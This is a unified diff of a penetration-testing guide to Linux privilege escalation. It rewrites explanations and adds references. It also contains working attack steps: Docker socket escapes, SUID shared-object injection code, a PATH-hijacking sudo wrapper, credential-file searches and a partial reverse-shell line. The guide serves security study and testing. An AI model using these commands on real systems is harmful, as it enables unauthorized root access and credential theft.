@@ -2,13 +2,15 @@
 
 <details>
 
-<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+Other ways to support HackTricks:
+
+* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 
@@ -93,7 +95,7 @@ You can check if the sudo version is vulnerable using this grep.
 sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
 ```
 
-### sudo < v1.28
+#### sudo < v1.28
 
 From @sickrov
 
@@ -169,8 +171,8 @@ cat /proc/sys/kernel/randomize_va_space 2>/dev/null
 
 If you are inside a docker container you can try to escape from it:
 
-{% content-ref url="docker-breakout/" %}
-[docker-breakout](docker-breakout/)
+{% content-ref url="docker-security/" %}
+[docker-security](docker-security/)
 {% endcontent-ref %}
 
 ## Drives
@@ -278,7 +280,7 @@ done
 
 #### /proc/$pid/maps & /proc/$pid/mem
 
-For a given process ID, \*\*maps show how memory is mapped within that process's \*\*virtual address space; it also shows the **permissions of each mapped region**. The **mem** pseudo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.
+For a given process ID, **maps show how memory is mapped within that process's** virtual address space; it also shows the **permissions of each mapped region**. The **mem** pseudo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.
 
 ```bash
 procdump()
@@ -538,7 +540,7 @@ Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd
 
 ## Sockets
 
-In brief, a Unix Socket (technically, the correct name is Unix Domain Socket, **UDS**) allows **communication between two different processes** on either the same machine or different machines in client-server application frameworks. To be more precise, it’s a way of communicating among computers using a standard Unix descriptors file. (From [here](https://www.linux.com/news/what-socket/)).
+Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.
 
 Sockets can be configured using `.socket` files.
 
@@ -594,47 +596,50 @@ If the socket **responds with an HTTP** request, then you can **communicate** wi
 
 ### Writable Docker Socket
 
-The **docker socke**t is typically located at `/var/run/docker.sock` and is only writable by the `root` user and `docker` group.\
-If for some reason **you have write permissions** over that socket you can escalate privileges.\
-The following commands can be used to escalate privileges:
+The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.
+
+#### **Privilege Escalation with Docker CLI**
+
+If you have write access to the Docker socket, you can escalate privileges using the following commands:
 
 ```bash
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
 
-#### Use docker web API from socket without docker package
+These commands allow you to run a container with root-level access to the host's file system.
 
-If you have access to **docker socket** but you can't use the docker binary (maybe it isn't even installed), you can use the web API directly with `curl`.
+#### **Using Docker API Directly**
 
-The following commands are an example of how to **create a docker container that mounts the root** of the host system and use `socat` to execute commands into the new docker.
+In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.
 
-```bash
-# List docker images
-curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
-#[{"Containers":-1,"Created":1588544489,"Id":"sha256:<ImageID>",...}]
-# Send JSON to docker API to create the container
-curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
-#{"Id":"<NewContainerID>","Warnings":[]}
-curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
-```
+1.  **List Docker Images:** Retrieve the list of available images.
 
-The last step is to use `socat` to initiate a connection to the container, sending an "attach" request
+    ```bash
+    curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
+    ```
+2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.
 
-```bash
-socat - UNIX-CONNECT:/var/run/docker.sock
-POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
-Host:
-Connection: Upgrade
-Upgrade: tcp
+    ```bash
+    curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
+    ```
 
-#HTTP/1.1 101 UPGRADED
-#Content-Type: application/vnd.docker.raw-stream
-#Connection: Upgrade
-#Upgrade: tcp
-```
+    Start the newly created container:
 
-Now, you can execute commands on the container from this `socat` connection.
+    ```bash
+    curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
+    ```
+3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.
+
+    ```bash
+    socat - UNIX-CONNECT:/var/run/docker.sock
+    POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
+    Host:
+    Connection: Upgrade
+    Upgrade: tcp
+    ```
+
+After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.
 
 ### Others
 
@@ -642,8 +647,8 @@ Note that if you have write permissions over the docker socket because you are *
 
 Check **more ways to break out from docker or abuse it to escalate privileges** in:
 
-{% content-ref url="docker-breakout/" %}
-[docker-breakout](docker-breakout/)
+{% content-ref url="docker-security/" %}
+[docker-security](docker-security/)
 {% endcontent-ref %}
 
 ## Containerd (ctr) privilege escalation
@@ -664,15 +669,17 @@ If you find that you can use the **`runc`** command read the following page as *
 
 ## **D-Bus**
 
-D-BUS is an **inter-Process Communication (IPC) system**, providing a simple yet powerful mechanism **allowing applications to talk to one another**, communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system.
+D-Bus is a sophisticated **inter-Process Communication (IPC) system** that enables applications to efficiently interact and share data. Designed with the modern Linux system in mind, it offers a robust framework for different forms of application communication.
 
-As a full-featured IPC and object system, D-BUS has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another—think **UNIX domain sockets on steroids**. Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately integrate better. For example, a Bluetooth daemon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object—think CORBA without the complications. _\*\*_(From [here](https://www.linuxjournal.com/article/7744)).
+The system is versatile, supporting basic IPC that enhances data exchange between processes, reminiscent of **enhanced UNIX domain sockets**. Moreover, it aids in broadcasting events or signals, fostering seamless integration among system components. For instance, a signal from a Bluetooth daemon about an incoming call can prompt a music player to mute, enhancing user experience. Additionally, D-Bus supports a remote object system, simplifying service requests and method invocations between applications, streamlining processes that were traditionally complex.
 
-D-Bus uses an **allow/deny model**, where each message (method call, signal emission, etc.) can be **allowed or denied** according to the sum of all policy rules which match it. Each rule in the policy should have the `own`, `send_destination` or `receive_sender` attribute set.
+D-Bus operates on an **allow/deny model**, managing message permissions (method calls, signal emissions, etc.) based on the cumulative effect of matching policy rules. These policies specify interactions with the bus, potentially allowing for privilege escalation through the exploitation of these permissions.
 
-Part of the policy of `/etc/dbus-1/system.d/wpa_supplicant.conf`:
+An example of such a policy in `/etc/dbus-1/system.d/wpa_supplicant.conf` is provided, detailing permissions for the root user to own, send to, and receive messages from `fi.w1.wpa_supplicant1`.
 
-```markup
+Policies without a specified user or group apply universally, while "default" context policies apply to all not covered by other specific policies.
+
+```xml
 <policy user="root">
     <allow own="fi.w1.wpa_supplicant1"/>
     <allow send_destination="fi.w1.wpa_supplicant1"/>
@@ -680,11 +687,6 @@ Part of the policy of `/etc/dbus-1/system.d/wpa_supplicant.conf`:
     <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
 </policy>
 ```
-
-Therefore, if a policy is allowing your user in any way to **interact with the bus**, you could be able to exploit it to escalate privileges (maybe just listing for some passwords?).
-
-Note that a **policy** that **doesn't specify** any user or group affects everyone (`<policy>`).\
-Policies to the context "default" affects everyone not affected by other policies (`<policy context="default"`).
 
 **Learn how to enumerate and exploit a D-Bus communication here:**
 
@@ -919,11 +921,14 @@ Then, when you call the suid binary, this function will be executed
 
 ### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 
-**LD\_PRELOAD** is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
+The **LD\_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.
 
-To avoid this mechanism being used as an attack vector for _suid/sgid_ executable binaries, the loader ignores _LD\_PRELOAD_ if _ruid != euid_. For such binaries, only libraries in standard paths that are also _suid/sgid_ will be preloaded.
+However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:
 
-If you find inside the output of **`sudo -l`** the sentence: _**env\_keep+=LD\_PRELOAD**_ and you can call some command with sudo, you can escalate privileges.
+* The loader disregards **LD\_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
+* For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.
+
+Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env\_keep+=LD\_PRELOAD**. This configuration allows the **LD\_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
 
 ```
 Defaults        env_keep += LD_PRELOAD
@@ -983,15 +988,15 @@ sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 
 ### SUID Binary – .so injection
 
-If you find some weird binary with **SUID** permissions, you could check if all the **.so** files are **loaded correctly**. To do so you can execute:
+When encountering a binary with **SUID** permissions that seems unusual, it's a good practice to verify if it's loading **.so** files properly. This can be checked by running the following command:
 
 ```bash
 strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 ```
 
-For example, if you find something like: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)_ you can exploit it.
+For instance, encountering an error like _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)"_ suggests a potential for exploitation.
 
-Create the file _/home/user/.config/libcalc.c_ with the code:
+To exploit this, one would proceed by creating a C file, say _"/path/to/.config/libcalc.c"_, containing the following code:
 
 ```c
 #include <stdio.h>
@@ -1004,13 +1009,15 @@ void inject(){
 }
 ```
 
-Compile it using:
+This code, once compiled and executed, aims to elevate privileges by manipulating file permissions and executing a shell with elevated privileges.
+
+Compile the above C file into a shared object (.so) file with:
 
 ```bash
-gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
 
-And execute the binary.
+Finally, running the affected SUID binary should trigger the exploit, allowing for potential system compromise.
 
 ## Shared Object Hijacking
 
@@ -1049,7 +1056,7 @@ that means that the library you have generated need to have a function called `a
 
 ### GTFOBins
 
-[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
+[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) is the same but for cases where you can **only inject arguments** in a command.
 
 The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
 
@@ -1060,13 +1067,15 @@ The project collects legitimate functions of Unix binaries that can be abused to
 
 {% embed url="https://gtfobins.github.io/" %}
 
+{% embed url="https://gtfoargs.github.io/" %}
+
 ### FallOfSudo
 
 If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.
 
 ### Reusing Sudo Tokens
 
-In the scenario where **you have a shell as a user with sudo privileges** but you don't know the password of the user, you can **wait for him/her to execute some command using `sudo`**. Then, you can **access the token of the session where sudo was used and use it to execute anything as sudo** (privilege escalation).
+In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.
 
 Requirements to escalate privileges:
 
@@ -1150,6 +1159,23 @@ If you know that a **user usually connects to a machine and uses `sudo`** to esc
 
 Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)
 
+Or running something like:
+
+```bash
+cat >/tmp/sudo <<EOF
+#!/bin/bash
+/usr/bin/sudo whoami > /tmp/privesc
+/usr/bin/sudo "\$@"
+EOF
+chmod +x /tmp/sudo
+echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other
+
+# From the victim
+zsh
+echo $PATH
+sudo ls
+```
+
 ## Shared Library
 
 ### ld.so
@@ -1220,7 +1246,8 @@ The **"read"** bit implies the user can **list** the **files**, and the **"write
 
 ## ACLs
 
-ACLs (Access Control Lists) are the second level of discretionary permissions, that **may override the standard ugo/rwx** ones. When used correctly they can grant you a **better granularity in setting access to a file or a directory**, for example by giving or denying access to a specific user that is neither the file owner nor the group owner (from [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)).\
+Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).
+
 **Give** user "kali" read and write permissions over a file:
 
 ```bash
@@ -1247,15 +1274,17 @@ In **newest versions** you will be able to **connect** to screen sessions only o
 
 ```bash
 screen -ls
+screen -ls <username>/ # Show another user' screen sessions
 ```
 
-![](<../../.gitbook/assets/image (130).png>)
+![](<../../.gitbook/assets/image (141).png>)
 
 **Attach to a session**
 
 ```bash
 screen -dr <session> #The -d is to detach whoever is attached to it
 screen -dr 3350.foo #In the example of the image
+screen -x [user]/[session id]
 ```
 
 ## tmux sessions hijacking
@@ -1270,7 +1299,7 @@ ps aux | grep tmux #Search for tmux consoles not using default folder for socket
 tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
 ```
 
-![](<../../.gitbook/assets/image (131).png>)
+![](<../../.gitbook/assets/image (837).png>)
 
 **Attach to a session**
 
@@ -1334,7 +1363,11 @@ Notice that if `Host` is `*` every time the user jumps to a different machine, t
 The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
 The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).
 
-If you Forward Agent configured in an environment \[**check here how to exploit it to escalate privileges**]\(ssh-forward-agent-exploitation.md).
+If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:
+
+{% content-ref url="ssh-forward-agent-exploitation.md" %}
+[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
+{% endcontent-ref %}
 
 ## Interesting Files
 
@@ -1454,7 +1487,7 @@ find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
 
 ```bash
-fils=`find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null`Hidden files
+find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
 ```
 
 ### Hidden files
@@ -1467,7 +1500,7 @@ find / -type f -iname ".*" -ls 2>/dev/null
 
 ```bash
 for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
-for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
+for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
 ```
 
 ### **Web files**
@@ -1482,7 +1515,7 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ### **Backups**
 
 ```bash
-find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/nulll
+find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
 
 ### Known files containing passwords
@@ -1534,8 +1567,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 ### Logrotate exploitation
 
-There is a vulnerability on `logrotate` that allows a user with **write permissions over a log file** or **any** of its **parent directories** to make `logrotate` write **a file in any location**. If **logrotate** is being executed by **root**, then the user will be able to write any file in _**/etc/bash\_completion.d/**_ that will be executed by any user that login.\
-So, if you have **write perms** over a **log file** **or** any of its **parent folder**, you can **privesc** (on most linux distributions, logrotate is executed automatically once a day as **user root**). Also, check if apart from _/var/log_ are more files being **rotated**.
+A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash\_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.
 
 {% hint style="info" %}
 This vulnerability affects `logrotate` version `3.18.0` and older
@@ -1548,6 +1580,8 @@ You can exploit this vulnerability with [**logrotten**](https://github.com/whotw
 This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
+
+**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
 If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.
 
@@ -1565,17 +1599,13 @@ DEVICE=eth0
 
 (_Note the blank space between Network and /bin/id_)
 
-**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
-
 ### **init, init.d, systemd, and rc.d**
 
-`/etc/init.d` contains **scripts** used by the System V init tools (SysVinit). This is the **traditional service management package for Linux**, containing the `init` program (the first process that is run when the kernel has finished initializing¹) as well as some infrastructure to start and stop services and configure them. Specifically, files in `/etc/init.d` are shell scripts that respond to `start`, `stop`, `restart`, and (when supported) `reload` commands to manage a particular service. These scripts can be invoked directly or (most commonly) via some other trigger (typically the presence of a symbolic link in `/etc/rc?.d/`). (From [here](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)). Other alternative to this folder is `/etc/rc.d/init.d` in Redhat.
+The directory `/etc/init.d` is home to **scripts** for System V init (SysVinit), the **classic Linux service management system**. It includes scripts to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.
 
-`/etc/init` contains **configuration** files used by **Upstart**. Upstart is a young **service management package** championed by Ubuntu. Files in `/etc/init` are configuration files telling Upstart how and when to `start`, `stop`, `reload` the configuration, or query the `status` of a service. As of lucid, Ubuntu is transitioning from SysVinit to Upstart, which explains why many services come with SysVinit scripts even though Upstart configuration files are preferred. The SysVinit scripts are processed by a compatibility layer in Upstart. (From [here](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)).
+On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit scripts are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.
 
-**systemd** is a **Linux initialization system and service manager that includes features like on-demand starting of daemons**, mount and automount point maintenance, snapshot support, and processes tracking using Linux control groups. systemd provides a logging daemon and other tools and utilities to help with common system administration tasks. (From [here](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)).
-
-Files that ship in packages downloaded from the distribution repository go into `/usr/lib/systemd/`. Modifications done by system administrator (user) go into `/etc/systemd/system/`.
+**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.
 
 ## Other Tricks
 
@@ -1623,24 +1653,34 @@ Files that ship in packages downloaded from the distribution repository go into 
 
 ## References
 
-[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
-[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
-[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
-[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
-[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
-[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
-[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
-[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
-[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
+* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
+* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
+* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
+* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
+* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
+* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
+* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
+* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
+* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
+* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
+* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
+* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
+* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
+* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
+* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
+* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
+* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
 
 <details>
 
-<summary><a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ HackTricks LIVE Twitch</strong></a> <strong>Wednesdays 5.30pm (UTC) 🎙️ -</strong> <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+Other ways to support HackTricks:
+
+* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
